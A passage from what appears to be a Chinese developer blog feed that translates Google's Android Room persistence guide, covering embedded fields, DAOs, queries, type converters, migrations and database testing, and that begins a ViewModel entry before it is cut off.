object来表示数据库的逻辑结构，即使这个object中往往有多个field。</p><p>举例 ：<code>User</code> 包含了<code>Address</code> field，而<code>Address</code>是一个复合类，又包含了<code>street</code>，<code>city</code>， <code>state</code>， 和 <code>postCode</code><br>。</p><p>这时，可以用<br><code>@Embedded</code>修饰一个subfields，来表明在数据库的同一行中分解这个subfields。</p><p>这里要想把<code>Address</code>字段在数据库表中分开, 只需要在<code>User</code>类中包含<code>@Embedded</code>修饰的 <code>Address</code> field 。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String street;</span><br><span class="line">    <span class="keyword">public</span> String state;</span><br><span class="line">    <span class="keyword">public</span> String city;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ColumnInfo</span>(name = <span class="string">"post_code"</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> postCode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PrimaryKey</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String firstName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Embedded</span></span><br><span class="line">    <span class="keyword">public</span> Address address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的table长这个样</p><table><thead><tr><th>id</th><th>firstName</th><th>street</th><th>state</th><th>city</th><th>post_code</th></tr></thead><tbody><tr><td>**</td><td>**</td><td>**</td><td>**</td><td>**</td><td>**</td></tr></tbody></table><p><strong>注意:</strong> 嵌套可以包含其他嵌套类，为了避免嵌套类的命名冲突，可以设置<code>@Embedded</code>的 <code>prefix</code>属性。</p><h3 id="data-access-objects-daos">Data Access Objects (DAOs)</h3><p>Room 的主要组件是<code>Dao</code>，DAOs抽象了一系列访问数据库的方法。</p><p><strong>注意:</strong> Room 默认不允许在main thread访问数据库，除非调用了<code>builder.allowMainThreadQueries()</code> 。但是异步查询(返回<code>LiveData</code>或者 RxJava <code>Flowable</code>的查询)例外。</p><h4 id="一些基于约定的查询">一些基于约定的查询</h4><p>有些查询仅仅用DAO类注解就能实现。</p><h5 id="insert">Insert</h5><ul><li><code>@Insert</code><br>Room 自动生成实现，所有的参数在一个transition内被提交并插入到数据库.</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Insert</span>(onConflict = OnConflictStrategy.REPLACE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertUsers</span><span class="params">(User... users)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertBothUsers</span><span class="params">(User user1, User user2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertUsersAndFriends</span><span class="params">(User user, List&lt;User&gt; friends)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Insert</code>方法根据参数个数返回对应的<code>long、long[]、List&lt;Long&gt;</code>类型的<code>rowId</code></p><h5 id="update">Update</h5><ul><li><code>Update</code> 使用参数中的 primary key 更新数据</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Update</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateUsers</span><span class="params">(User... users)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可选让方法返回<code>int</code>表示 rows updated。</p><h5 id="delete">Delete</h5><ul><li><code>Delete</code> 使用参数中的 primary key删除数据</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Delete</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteUsers</span><span class="params">(User... users)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可选让方法返回<code>int</code>表示 rows removed。</p><h5 id="methods-using-query">Methods using @Query</h5><p><code>@Query</code> 可以读写数据库， <code>@Query</code>方法会在编译期验证查询语法，同时，Room也会验证返回值的字段名是否和查询字段名一致。</p><ul><li>只有部分字段名匹配，验证抛出warning.</li><li>没有任何字段名匹配，验证抛出error</li></ul><h6 id="简单的-queries">简单的 queries</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user"</span>)</span><br><span class="line">    <span class="keyword">public</span> User[] loadAllUsers();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译期，Room 就已经知道查询user 数据表的所有字段了。如果查询语句有语法错误、或者user表不存在，Room 都会在编译期显示错误信息。</p><h6 id="带参数的-query">带参数的 query</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE age &gt; :minAge"</span>)</span><br><span class="line">    <span class="keyword">public</span> User[] loadAllUsersOlderThan(<span class="keyword">int</span> minAge);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译期, Room会依据参数名字进行绑定，比如 <code>:minAge</code> 会和 <code>minAge</code>参数绑定。绑定失败，编译期就会报错。</p><p>多个参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE age BETWEEN :minAge AND :maxAge"</span>)</span><br><span class="line">    <span class="keyword">public</span> User[] loadAllUsersBetweenAges(<span class="keyword">int</span> minAge, <span class="keyword">int</span> maxAge);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE first_name LIKE :search "</span></span><br><span class="line">           + <span class="string">"OR last_name LIKE :search"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findUserWithName</span><span class="params">(String search)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="返回结构集映射">返回结构集映射</h6><p>Room 通过定义所需的pojo来支持select<br>映射。</p><p>比如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NameTuple</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ColumnInfo</span>(name=<span class="string">"first_name"</span>)</span><br><span class="line">    <span class="keyword">public</span> String firstName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ColumnInfo</span>(name=<span class="string">"last_name"</span>)</span><br><span class="line">    <span class="keyword">public</span> String lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, you can use this POJO in your query method:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT first_name, last_name FROM user"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;NameTuple&gt; <span class="title">loadFullName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**注意:**这些 POJOs 同样可以使用<code>@Embedded</code> annotation。</p><h6 id="passing-a-collection-of-arguments">Passing a collection of arguments</h6><p>某些查询需要传入个数可变的参数，比如具体数量直到运行期才确定的。 当参数为一个集合时，Room会在运行期自动将其展开为个数确定的参数集。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT first_name, last_name FROM user WHERE region IN (:regions)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;NameTuple&gt; <span class="title">loadUsersFromRegions</span><span class="params">(List&lt;String&gt; regions)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="observable-queries">Observable queries</h6><p>使用LiveData作为查询函数的返回值可以在查询数据更新时，自动通知UI。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT first_name, last_name FROM user WHERE region IN (:regions)"</span>)</span><br><span class="line">    <span class="keyword">public</span> LiveData&lt;List&lt;User&gt;&gt; loadUsersFromRegionsSync(List&lt;String&gt; regions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="rxjava">RxJava</h6><p>Room也可以和RxJava2配合使用，使用<code>Publisher</code>或者 <code>Flowable</code>作为查询函数的返回值即可。</p><p><code>build.gradle</code></p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">compile <span class="string">'android.arch.persistence.room:rxjava2:1.0.0-alpha1'</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * from user where id = :id LIMIT 1"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Flowable&lt;User&gt; <span class="title">loadUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="直接返回-cursor">直接返回 cursor</h6><p>Room也可以直接返回 <code>Cursor</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE age &gt; :minAge LIMIT 5"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cursor <span class="title">loadRawUsersOlderThan</span><span class="params">(<span class="keyword">int</span> minAge)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 原则上不鼓励使用Cursor API，因为它既不保证row查询结果存在，也不保证row保存的数据是否和查询数据一致。</p><h6 id="跨表查询">跨表查询</h6><p>可以直接在Query中使用join，如果查询方法的返回数据类型是<code>Flowable</code> 或者<code>LiveData</code>，Room 会检查所有的涉及到的表。</p><p>下面的代码表示查询某个用户借的书籍，<code>user</code> 表 join <code>loan</code>表 join <code>book</code>表</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM book "</span></span><br><span class="line">           + <span class="string">"INNER JOIN loan ON loan.book_id = book.id "</span></span><br><span class="line">           + <span class="string">"INNER JOIN user ON user.id = loan.user_id "</span></span><br><span class="line">           + <span class="string">"WHERE user.name LIKE :userName"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> List&lt;Book&gt; <span class="title">findBooksBorrowedByNameSync</span><span class="params">(String userName)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以直接返回POJOs，比如下面返回user的宠物的名字。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyDao</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Query</span>(<span class="string">"SELECT user.name AS userName, pet.name AS petName "</span></span><br><span class="line">          + <span class="string">"FROM user, pet "</span></span><br><span class="line">          + <span class="string">"WHERE user.id = pet.user_id"</span>)</span><br><span class="line">   <span class="keyword">public</span> LiveData&lt;List&lt;UserPet&gt;&gt; loadUserAndPetNames();</span><br><span class="line"></span><br><span class="line">   <span class="comment">// You can also define this class in a separate file, as long as you add the</span></span><br><span class="line">   <span class="comment">// "public" access modifier.</span></span><br><span class="line">   <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserPet</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> String userName;</span><br><span class="line">       <span class="keyword">public</span> String petName;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关于类型转换">关于类型转换</h3><p>Room 提供了内建的基础数据类型和封装类型的自动转换。有时，为了在数据库的某个字段中存储自定义的数据类型，你需要提供一个从自定义类到已知类型的<code>TypeConverter</code>转化器。</p><p>比如，将<code>Date</code>数据类型转化为<code>Unix timestamp</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Converters</span> </span>&#123;</span><br><span class="line">    <span class="meta">@TypeConverter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Date <span class="title">fromTimestamp</span><span class="params">(Long value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value == <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">new</span> Date(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TypeConverter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Long <span class="title">dateToTimestamp</span><span class="params">(Date date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date == <span class="keyword">null</span> ? <span class="keyword">null</span> : date.getTime();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来将<code>@TypeConverters</code>添加到<code>AppDatabase</code>类，让entity和DAO都可以使用这个converter</p><p>AppDatabase.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Database</span>(entities = &#123;User.java&#125;, version = <span class="number">1</span>)</span><br><span class="line"><span class="meta">@TypeConverters</span>(&#123;Converter.class&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AppDatabase</span> <span class="keyword">extends</span> <span class="title">RoomDatabase</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> UserDao <span class="title">userDao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用converters后，在查询时也可以直接使用自定义类型。</p><p>User.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserDao.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Query</span>(<span class="string">"SELECT * FROM user WHERE birthday BETWEEN :from AND :to"</span>)</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">findUsersBornBetweenDates</span><span class="params">(Date from, Date to)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了在<code>AppDatabase</code>上应用 <code>@TypeConverters</code> ，还可以在entities、 DAOs、以及 DAO 方法上面应用。</p><h3 id="database-migration">Database migration</h3><p>数据库结构升级时，需要提供一个从低版本到高版本的迁移方法。在Room中，通过实现<code>Migration</code> 类来完成这个过程。每个<code>Migration</code>类都定义了 <code>startVersion</code> 和 <code>endVersion</code>。在运行期, Room 会调用每个<code>Migration</code> 的 <code>migrate()</code>方法 ，并用正确的顺序迁移数据库到最新的版本。</p><p><strong>注意:</strong> 如果没有提供必须的migration, Room 会重建每个数据, 低版本的数据会丢失。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Room.databaseBuilder(getApplicationContext(), MyDb.class, <span class="string">"database-name"</span>)</span><br><span class="line">        .addMigrations(MIGRATION_1_2, MIGRATION_2_3).build();</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> Migration MIGRATION_1_2 = <span class="keyword">new</span> Migration(<span class="number">1</span>, <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">migrate</span><span class="params">(SupportSQLiteDatabase database)</span> </span>&#123;</span><br><span class="line">        database.execSQL(<span class="string">"CREATE TABLE `Fruit` (`id` INTEGER, "</span></span><br><span class="line">                + <span class="string">"`name` TEXT, PRIMARY KEY(`id`))"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> Migration MIGRATION_2_3 = <span class="keyword">new</span> Migration(<span class="number">2</span>, <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">migrate</span><span class="params">(SupportSQLiteDatabase database)</span> </span>&#123;</span><br><span class="line">        database.execSQL(<span class="string">"ALTER TABLE Book "</span></span><br><span class="line">                + <span class="string">" ADD COLUMN pub_year INTEGER"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 为了维持migration的正常运作, 总是使用 full queries 而不是引用常量的queries.</p><p>迁移结束后，Room 会验证表的元数据正确。如果验证失败就会抛出异常。</p><h4 id="测试-migrations">测试 migrations</h4><p>Room 提供了一个测试 migration 是否正常工作的库</p><p>首先，需要导出数据库元数据</p><h4 id="exporting-schemas">Exporting schemas</h4><p>在<code>build.gradle</code>设置<code>room.schemaLocation</code>annotation processor 属性即可导出数据库元信息，导出的数据库信息存储在一个json文件中。</p><p>build.gradle</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ...</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">        javaCompileOptions &#123;</span><br><span class="line">            annotationProcessorOptions &#123;</span><br><span class="line">                arguments = [<span class="string">"room.schemaLocation"</span>:</span><br><span class="line">                             <span class="string">"$projectDir/schemas"</span>.toString()]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你应该把这个json文件添加到vcs中，Room会根据这个文件创建低版本的数据库方便测试。</p><p>接下来继续修改<code>build.gradle</code></p><p>添加测试依赖</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">testCompile <span class="string">'android.arch.persistence.room:testing:***'</span></span><br></pre></td></tr></table></figure><p>添加 schema 的 asset 文件位置</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ...</span><br><span class="line">    sourceSets &#123;</span><br><span class="line">        androidTest.assets.srcDirs += files(<span class="string">"$projectDir/schemas"</span>.toString())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试库提供了一个<code>MigrationTestHelper</code> 类, 它可以读取 schema 文件. 同时这个Helper还是一个Junit4 <code>TestRule</code> 类, 它会自动管理创建的数据库。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(AndroidJUnit4.class)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MigrationTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TEST_DB = <span class="string">"migration-test"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Rule</span></span><br><span class="line">    <span class="keyword">public</span> MigrationTestHelper helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MigrationTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        helper = <span class="keyword">new</span> MigrationTestHelper(InstrumentationRegistry.getInstrumentation(),</span><br><span class="line">                MigrationDb.class.getCanonicalName(),</span><br><span class="line">                <span class="keyword">new</span> FrameworkSQLiteOpenHelperFactory());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">migrate1To2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        SupportSQLiteDatabase db = helper.createDatabase(TEST_DB, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// db has schema version 1. insert some data using SQL queries.</span></span><br><span class="line">        <span class="comment">// You cannot use DAO classes because they expect the latest schema.</span></span><br><span class="line">        db.execSQL(...);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Prepare for the next version.</span></span><br><span class="line">        db.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Re-open the database with version 2 and provide</span></span><br><span class="line">        <span class="comment">// MIGRATION_1_2 as the migration process.</span></span><br><span class="line">        db = helper.runMigrationsAndValidate(TEST_DB, <span class="number">2</span>, <span class="keyword">true</span>, MIGRATION_1_2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// MigrationTestHelper automatically verifies the schema changes,</span></span><br><span class="line">        <span class="comment">// but you need to validate that the data was migrated properly.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试你的-database">测试你的 database</h3><p>测试应用时，我们没必要创建整个数据库，因为我们并不是要测试数据库底层。 Room 允许你在测试时mock一个数据获取层。 这套机制是基于DAOs和数据库实现细节清晰的划分实现的。当测试时，你应该 mock DAO 实例.</p><p>2种测试思路:</p><ul><li>开发机上测试。</li><li>真机测试。</li></ul><h4 id="开发机上测试">开发机上测试</h4><p>Room 使用的 SQLite Support 库, 这个库是基于Android Framework实现的接口。为了测试，也可以使用一个实现了接口的自定义 support 库。</p><p>这种做法优点是：测试运行速度快，缺点是：设备端的SQLite的版本可能和host机器上的不一致。</p><h4 id="android-真机测试">Android 真机测试</h4><p>这也是推荐的测试方式，在真机上跑Junit测试用例。由于节省了创建activity的开销，运行速度比那些UI测试快一点。</p><p>创建测试时，需要生成一个基于内存的database，以免影响到外部数据。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(AndroidJUnit4.class)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleEntityReadWriteTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> UserDao mUserDao;</span><br><span class="line">    <span class="keyword">private</span> TestDatabase mDb;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createDb</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Context context = InstrumentationRegistry.getTargetContext();</span><br><span class="line">        mDb = Room.inMemoryDatabaseBuilder(context, TestDatabase.class).build();</span><br><span class="line">        mUserDao = mDb.getUserDao();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">closeDb</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        mDb.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeUserAndReadInList</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = TestUtil.createUser(<span class="number">3</span>);</span><br><span class="line">        user.setName(<span class="string">"george"</span>);</span><br><span class="line">        mUserDao.insert(user);</span><br><span class="line">        List&lt;User&gt; byName = mUserDao.findUsersByName(<span class="string">"george"</span>);</span><br><span class="line">        assertThat(byName.get(<span class="number">0</span>), equalTo(user));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="附录-为什么不支持-entities-之间引用">附录: 为什么不支持 entities 之间引用</h3><p>将数据库之间的关系映射到entities上，并延迟加载的做法，在服务端开发已经有很成熟的应用了。</p><p>但是在客户端，延迟加载并不可行，因为延迟加载往往发生在UI线程，从而导致严格的性能问题，activity只有16ms来绘制UI界面，即使数据库查询只花了5ms，任然有很大可能绘制超时，导致界面卡顿。另外，如果并行的在数据库上执行多个查询，或者设备同时在执行一个重IO的任务，那么延迟加载会花费更多时间。而如果不使用延迟加载策略，应用往往会load比预期更多的数据，从而加重了内存负担。</p><p>ORMs 经常将这种锅抛给程序员，让他们自己去选择。 不幸的是，在程序员往往在app和UI界面间共享 model。当UI发生变化，你很难去预测和调试遇到的种种问题。</p><p>举例说明，有一个界面需要加载 <code>Book</code> 列表，每个<code>Book</code>都有<code>Author</code>字段，你决定采用延迟加载策略，<code>Book</code>通过调用<code>getAuthor()</code>时返回作者信息。第一次调用<code>getAuthor()</code>时才会去查询数据库。这时要在在UI上显示作者姓名，你可能会写下面的代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">authorNameTextView.setText(user.getAuthor().getName());</span><br></pre></td></tr></table></figure><p>这时，<code>getAuthor()</code> 查询数据库的动作在main线程上运行。</p><p>如果采用主动查询策略，当UI不再需要作者信息时，<code>Book</code>任然会加载对应的 <code>Author</code>信息。而且，如果<code>Author</code>又查询了另外一张表，比如<code>getBooks()</code>，情况变得更糟。</p><p>基于以上原因，Room 不允许entity之间的互相引用，而且，你必须显式的申明请求所需的数据。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将介绍Architecture Components中的Room组件&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://deskid.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>[简译]Google 官方 App 架构 Guide(5)</title>
    <link href="https://deskid.github.io/2017/06/19/Guide-to-App-Architecture-5/"/>
    <id>https://deskid.github.io/2017/06/19/Guide-to-App-Architecture-5/</id>
    <published>2017-06-19T10:42:14.000Z</published>
    <updated>2018-11-14T03:33:00.895Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍Architecture Components中的ViewModel组件</p><a id="more"></a><h2 id="viewmodel">ViewModel</h2><p>The <code>ViewModel</code> 用来管理和存储UI相关的数据，和普通的data store 不同的是：它能在 configuration changes 后，保持存活.</p><p><code>ViewModel</code>主要解决了以下问题：</p><ol><li><p>activities 和 fragments组件,随时可能会被系统 destroy 或者 recreate 。但是存储在组件中的数据状态却可能因此丢失，<code>onSaveInstanceState()</code>是一种解决办法，但是这个方法的本意是用来存储并还原UI，并不适合存储大量数据。</p></li><li><p>我们经常在组件中执行一些异步操作，有一个常见的新手 crash 就是在异步回调中没有检查组件生命周期就直接去访问UI。异步回调另一个问题是内存泄露。避免这些bug很简单，在 UI controller destroy时，清理掉异步回调。但是为啥不能让UI自动清理，而且，recreate后，我们得重新加载这些异步操作。</p></li><li><p>UI controllers 本来就需要处理用户交互。现在还得自己处理数据资源了。大部分的Activity最后都变成了&quot;god activities&quot;。测试这些类只会让人头疼。</p></li></ol><!-- more --><p>show me the code</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModel</span> <span class="keyword">extends</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MutableLiveData&lt;List&lt;User&gt;&gt; users;</span><br><span class="line">    <span class="keyword">public</span> LiveData&lt;List&lt;User&gt;&gt; getUsers() &#123;</span><br><span class="line">        <span class="keyword">if</span> (users == <span class="keyword">null</span>) &#123;</span><br><span class="line">            users = <span class="keyword">new</span> MutableLiveData&lt;List&lt;Users&gt;&gt;();</span><br><span class="line">            loadUsers();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    